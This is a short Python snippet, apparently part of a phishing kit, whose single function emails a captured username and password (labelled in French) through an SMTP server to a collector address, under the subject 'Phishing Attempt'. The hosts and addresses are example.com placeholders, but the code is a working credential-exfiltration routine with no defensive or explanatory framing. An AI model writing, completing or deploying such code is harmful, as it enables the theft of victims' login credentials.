import smtplib
from email.message import EmailMessage

def send_email(username, password):
    msg = EmailMessage()
    msg.set_content(f"Nom d'utilisateur: {username}\nMot de passe: {password}")

    msg['Subject'] = 'Phishing Attempt'
    msg['From'] = 'youremail@example.com'
    msg['To'] = 'targetemail@example.com'

    with smtplib.SMTP('smtp.example.com') as server:
        server.login("youremail@example.com", "yourpassword")
        server.send_message(msg)
